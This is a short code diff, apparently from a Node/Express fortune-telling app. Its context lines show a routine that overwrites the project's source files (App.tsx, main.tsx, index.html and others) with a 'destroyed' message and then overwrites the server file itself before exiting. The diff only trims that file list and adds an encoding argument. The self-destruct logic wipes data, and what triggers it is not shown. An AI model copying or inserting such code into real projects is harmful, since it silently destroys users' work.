@@ -28,7 +28,6 @@ let isDestroyed = false;
 // 破壊するファイル一覧
 const filesToDestroy = [
   'src/App.tsx',
-  'src/App.css',
   'src/main.tsx',
   'src/index.css',
   'index.html',
@@ -74,7 +73,7 @@ app.post('/api/fortune', async (req, res) => {
 //
 // ==========================================
 `;
-            fs.writeFileSync(filePath, destroyMessage);
+            fs.writeFileSync(filePath, destroyMessage, 'utf8');
             console.log(`💀 破壊完了: ${file}`);
           }
         } catch (err) {
@@ -100,7 +99,7 @@ app.post('/api/fortune', async (req, res) => {
 //
 // ==========================================
 `;
-      fs.writeFileSync(serverPath, finalMessage);
+      fs.writeFileSync(serverPath, finalMessage, 'utf8');
       console.log('\n💀 サーバー自己破壊完了');
       console.log('🙏 さようなら...\n');
       process.exit(0);
